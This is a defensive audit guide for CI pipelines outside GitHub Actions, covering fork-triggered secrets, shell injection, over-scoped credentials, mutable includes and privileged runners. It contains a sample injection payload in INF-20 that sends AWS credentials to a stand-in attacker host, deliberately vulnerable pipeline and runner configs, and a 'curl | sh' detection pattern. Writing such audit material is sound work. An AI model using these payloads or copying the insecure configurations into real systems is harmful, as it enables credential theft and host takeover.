# Knowledge pack — CI platforms other than GitHub Actions (GitLab CI, Jenkins, Azure Pipelines, CircleCI, Bitbucket)

> **When to load this file:** the inventory contains `.gitlab-ci.yml`, a `Jenkinsfile` or `jobs/*/config.xml`, `azure-pipelines.yml`, `.circleci/config.yml` or `bitbucket-pipelines.yml`.
> **Do not load it if:** the only pipeline is GitHub Actions — that is `infra-cloud-cicd-exposure.md` §4, `INF-13`..`INF-16`.
> **Cost:** ~146 lines. The other files of this pack are `infra-cloud.md` (`INF-01`..`INF-12`) and `infra-cloud-cicd-exposure.md` (`INF-13`..`INF-18`).

## Selective loading index
| Section | Load it if the inventory has | Procedures |
|---|---|---|
| §7 Who can make the pipeline run, and with what attached | any of the five platform files above | INF-19 … INF-23 |

## Why this file exists

`INF-13`..`INF-16` are written against GitHub Actions **symbols**: `pull_request_target`, `${{ github.event.* }}`, `permissions:`, `uses: owner/action@sha`. The attack classes behind them are platform-independent — the `CICD-SEC-*` catalogue is — but a reader who only has those four procedures walks into a GitLab or Jenkins repository with the right questions and no idea what to grep for, and reports nothing. That silence is indistinguishable from a clean pipeline, which is the worst failure this corpus can produce.

So these five procedures are organised **by class, with the symbols of five platforms inside each**. Reason from the class; search with the symbols of the platform in front of you.

**Tooling reality, stated once so no procedure has to repeat it.** There is no `zizmor` for these platforms — no widely used tool that reads a `.gitlab-ci.yml` or a `Jenkinsfile` and reasons about *trigger, privilege and untrusted input* the way `zizmor` does for Actions. `checkov` ships policy frameworks for several of them (`--framework gitlab_ci,azure_pipelines,circleci_pipelines,bitbucket_pipelines`) and covers part of the ground; `glab ci lint` and the Jenkins declarative linter validate **syntax and schema only** and say nothing about security. Expect to read the file yourself, and never report a pipeline as clean because a linter was quiet.

## §7 Who can make the pipeline run, and with what attached

### INF-19 An outside contributor can make the pipeline execute their code with secrets attached
**Where to look**
- **GitLab** → `.gitlab-ci.yml` with `rules:` or `only:` on `merge_request_event`. The decisive fact: a merge-request pipeline runs **the `.gitlab-ci.yml` of the source branch**, so a contributor who can open an MR is proposing the pipeline definition as well as the code. Then `Settings → CI/CD → Variables`: any variable **not** marked `Protected` is available to that pipeline.
- **Jenkins** → the multibranch/organization folder's branch sources: *Discover pull requests from forks* with strategy **"Merging the pull request with the current target branch revision"**, plus a `Jenkinsfile` read from the fork's branch.
- **CircleCI** → project settings *Build forked pull requests* and, decisively, *Pass secrets to builds from forked pull requests*.
- **Azure Pipelines** → `pr:` trigger in `azure-pipelines.yml` together with the repository setting *Make secrets available to builds of fork pull requests*.
- **Bitbucket** → `pipelines: pull-requests:` and repository variables that are not `secured`.

**Vulnerable pattern**
```yaml
# .gitlab-ci.yml — this file comes from the contributor's branch
test:
  rules: [{ if: '$CI_PIPELINE_SOURCE == "merge_request_event"' }]
  script:
    - ./scripts/test.sh            # their script, their pipeline definition
    - curl -H "PRIVATE-TOKEN: $DEPLOY_TOKEN" "$INTERNAL_API"   # unprotected variable
```
**What rules it out (false positive)**
- Every credential the job can reach is marked **Protected** (GitLab) / not passed to fork builds (CircleCI, Azure) / `secured` (Bitbucket), and the MR pipeline runs on an unprotected branch — then the job runs attacker code with no secret to steal, and the finding moves to the runner (`INF-23`) instead of disappearing.
- The pipeline for outside contributions requires a maintainer to press *Run pipeline* / approve the environment before anything executes, and that gate cannot be satisfied by the contributor.

Rules: FP-01, FP-08.

**Minimal test**: `rg -n 'merge_request_event|pull-requests:|^pr:|CHANGE_ID' .gitlab-ci.yml azure-pipelines.yml bitbucket-pipelines.yml Jenkinsfile 2>/dev/null`, then list which variables the job can read and ask, for each, whether an outside contributor's branch reaches it. The variable scope lives in the platform UI, not in the repository: without the exported setting the answer is `UNKNOWN`, not "safe".\
**Traceability**: `CWE-94` · `CWE-829` · `A03:2025` · `A08:2025` · `CICD-SEC-1` · `CICD-SEC-4` · `SSDF PW` · `SLSA Build L2` · `NIST 800-53 SA`\
**Tooling**: none of the linters answers this, because the answer is half in the file and half in a project setting. `checkov --framework gitlab_ci` will not tell you whether a variable is protected. Ask for the exported settings and treat their absence as `UNKNOWN` (`FP-08`).

### INF-20 Merge-request metadata interpolated into a shell step
**Where to look**
- **GitLab** → `$CI_MERGE_REQUEST_TITLE`, `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, `$CI_COMMIT_TITLE`, `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_REF_NAME` inside `script:`.
- **Jenkins** → `${env.CHANGE_TITLE}`, `${env.CHANGE_BRANCH}`, `${env.BRANCH_NAME}`, `${params.ANYTHING}` inside a **double-quoted** Groovy string passed to `sh`/`bat`. Groovy interpolates before the shell ever sees the text, so the quoting the reader expects to protect them is applied to a string that already contains the attacker's characters.
- **Azure Pipelines** → `$(System.PullRequest.SourceBranch)`, `$(Build.SourceVersionMessage)` in `script:`; and `${{ }}` template expressions, which are substituted at compile time.
- **CircleCI** → `<< pipeline.git.branch >>` in a `run:` command.

**Vulnerable pattern**
```groovy
// Jenkinsfile — double quotes: Groovy substitutes first, the shell sees the result
sh "echo 'Reviewing ${env.CHANGE_TITLE}' >> report.txt"
// a title of:  '; curl attacker.tld/$(cat ~/.aws/credentials) #
```
**What rules it out (false positive)**
- The value is passed through the environment and referenced as a quoted shell variable — `sh 'echo "$CHANGE_TITLE"'` in Jenkins (single-quoted Groovy), `script: echo "$CI_COMMIT_TITLE"` in GitLab — so it is data to the shell, not text spliced into the script.
- The field is not contributor-controlled: `$CI_PIPELINE_ID`, `$CI_PROJECT_PATH`, `$(Build.BuildId)`.

Rules: FP-01, FP-02.

**Minimal test**: `rg -n 'sh\s+"' -A2 Jenkinsfile` and `rg -n '\$(CI_(MERGE_REQUEST|COMMIT)_[A-Z_]+)' .gitlab-ci.yml`; for each hit decide whether the value is interpolated into the script **text** or read by the shell as a variable. Only the first is a finding. The Jenkins documentation states the rule in one line: use single quotes and let the shell expand, because Groovy interpolation happens first — the same reason it also leaks credentials into the process listing.\
**Traceability**: `CWE-78` · `CWE-77` · `CWE-94` · `A03:2025` · `CICD-SEC-4` · `SSDF PW` · `NIST 800-53 SI`\
**Tooling**: `checkov --framework gitlab_ci` has a rule for shell injection in GitLab scripts; nothing equivalent reads a `Jenkinsfile`, which is Groovy, not YAML. For Jenkins this is a reading task, and the tell is the double quote.

### INF-21 The credential is scoped so widely that no leak is needed
**Where to look**
- **GitLab** → `CI_JOB_TOKEN` and what it can reach: *Settings → CI/CD → Job token permissions*. GitLab moved this from "any project the user can see" towards an explicit allowlist over the 16.x–17.0 line; which behaviour an instance has depends on its version and on whether the project opted in, so read the setting rather than assuming either default. Also `masked` vs `protected` on variables: **masked only redacts the value in the log**; it does nothing to stop the job from sending it somewhere.
- **Jenkins** → `withCredentials([...])` puts the secret in the **environment of every child process** of that block, so any tool it runs can read it and any `set -x` prints it. Credentials stored at the root scope rather than in a folder are visible to every job on the controller.
- **Azure Pipelines** → variable groups linked to a pipeline with no approval or check; `System.AccessToken` with the project-collection build service identity.
- **CircleCI** → contexts with no restriction, readable by any job in any project of the organisation.

**Vulnerable pattern**
```groovy
withCredentials([string(credentialsId: 'npm-publish', variable: 'NPM_TOKEN')]) {
  sh 'npm ci && npm test && npm run build'   // every one of these can read $NPM_TOKEN
}
```
**What rules it out (false positive)**
- The credential is scoped to exactly the job that needs it — a folder-scoped Jenkins credential used by one stage, a GitLab variable that is `Protected` and an environment scope of one, a CircleCI context restricted to a security group — and nothing else in the pipeline can read it.
- The token is short-lived and audience-bound (OIDC to the cloud provider with a subject claim naming the branch), so what a job can steal expires and is useless elsewhere.

Rules: FP-08, FP-10.

**Minimal test**: for each secret the pipeline uses, name the smallest set of processes that can read it and compare it with the set that needs it. In Jenkins that means reading the block, not the credential definition; in GitLab it means the variable's `Protected`/`Environment scope` columns. The **CircleCI incident of January 2023** is the argument for why "scope" and not "leak" is the right question: an engineer's laptop was compromised, and because contexts and project variables are readable by the platform, CircleCI told every customer to rotate **all** secrets rather than a subset.\
**Traceability**: `CWE-522` · `CWE-732` · `CWE-269` · `A01:2025` · `CICD-SEC-2` · `CICD-SEC-6` · `SSDF PO` · `NIST 800-53 AC` · `CCM IAM`\
**Tooling**: a secret scanner finds the secret that was committed; nothing measures the blast radius of a secret that was stored correctly. This one is read by hand, and the answer without the exported platform settings is `UNKNOWN` (`FP-08`).

### INF-22 The pipeline imports its own code from a pointer that can move
**Where to look**
- **GitLab** → `include: { project: 'g/templates', ref: 'main' }` (a branch, not a tag or SHA), `include: { remote: 'https://…/x.yml' }` (whatever that URL serves today), and `image:`/`services:` by moving tag.
- **Jenkins** → `@Library('shared') _` with no version, or `@Library('shared@main')`; plugin versions unpinned; scripts approved once in *In-process Script Approval* and then edited upstream.
- **Azure Pipelines** → `resources: repositories:` with `ref: refs/heads/main`, and `extends: template: x.yml@templates`.
- **CircleCI** → `orbs: node: circleci/node@5.1` — an orb version range resolves to whatever satisfies it, which is not a digest.
- **Bitbucket** → `pipe: atlassian/aws-ecs-deploy:1.6.2` versus a moving tag.
- **Any platform** → `curl … | bash` in a step. The URL is the dependency.

**Vulnerable pattern**
```yaml
include:
  - project: platform/ci-templates
    ref: main                      # whoever can push to that branch owns this pipeline
    file: /build.yml
```
**What rules it out (false positive)**
- The reference is immutable: a commit SHA, or a tag in a repository where tags are protected and cannot be repointed.
- The included project sits inside the same access-control perimeter and only the same maintainers can push to it — still worth pinning, but not a third-party risk (`FP-06` names the boundary).

Rules: FP-06, FP-09.

**Minimal test**: list every `include`, `@Library`, `extends`, `orbs`, `pipe` and piped-download in the pipeline and mark each as immutable or moving; the count of moving references is the finding. **Codecov's Bash Uploader (modified from late January 2021, disclosed 1 April 2021)** is the case to argue with: thousands of pipelines ran `curl … | bash` against a URL, the script was altered at the source, and it exported the environment of every CI job that fetched it — no repository was compromised, and every one of them was affected.\
**Traceability**: `CWE-829` · `CWE-494` · `CWE-345` · `A08:2025` · `CICD-SEC-3` · `SLSA Build L2` · `SLSA Build L3` · `SSDF PW` · `SSDF PS`\
**Tooling**: `rg -n 'include:|@Library|extends:|orbs:|pipe:|curl .*\| *(ba)?sh'` over the pipeline files. No scanner resolves what those pointers referred to at build time, which is the whole problem: reproducing yesterday's build is what proves it.

### INF-23 The runner is a persistent, shared or privileged machine
**Where to look**
- **GitLab** → runner `config.toml` with `privileged = true` (what docker-in-docker asks for), a `/var/run/docker.sock` volume, or `executor = "shell"`; shared runners serving a project that also runs outside contributions (`INF-19`).
- **Jenkins** → builds executing on the **controller** (`agent any` with executors on the built-in node), agents whose workspace is reused between jobs, agents holding cloud instance credentials.
- **Azure Pipelines** → self-hosted agent pools without *Restrict to authorized pipelines*, agents in a subnet that reaches production.
- **CircleCI** → the `machine` executor and `setup_remote_docker`; self-hosted runners.
- **Bitbucket** → self-hosted runners on a machine with anything else on it.

**Vulnerable pattern**
```toml
# GitLab runner config.toml
[[runners]]
  executor = "docker"
  [runners.docker]
    privileged = true                                  # container escape by design
    volumes = ["/var/run/docker.sock:/var/run/docker.sock", "/cache"]
```
**What rules it out (false positive)**
- The runner is ephemeral — one job per instance, destroyed afterwards — with no long-lived cloud credential on the instance and no route to anything but the artifact store.
- Only trusted principals can schedule work on it: a protected-branch-only runner, or an agent pool restricted to named pipelines, so `INF-19` does not reach it.

Rules: FP-05, FP-06.

**Minimal test**: for one build, name what survives it — the workspace, the Docker layer cache, `~/.docker/config.json`, the instance metadata credential — and who else runs on the same machine. `privileged = true` plus a pipeline reachable by an outside contributor is host root, and it is documented as such by the runner's own configuration reference: it exists to make docker-in-docker work, and it grants the container the host's capabilities.\
**Traceability**: `CWE-250` · `CWE-269` · `CWE-668` · `A01:2025` · `CICD-SEC-7` · `CICD-SEC-9` · `ATT&CK T1610` · `NIST 800-53 CM` · `CCM IVS`\
**Tooling**: `checkov --framework gitlab_ci` does not read `config.toml`; the runner configuration is usually outside the repository you were given. Ask for it. If it does not arrive, the finding is `UNKNOWN` and says so, rather than being dropped.
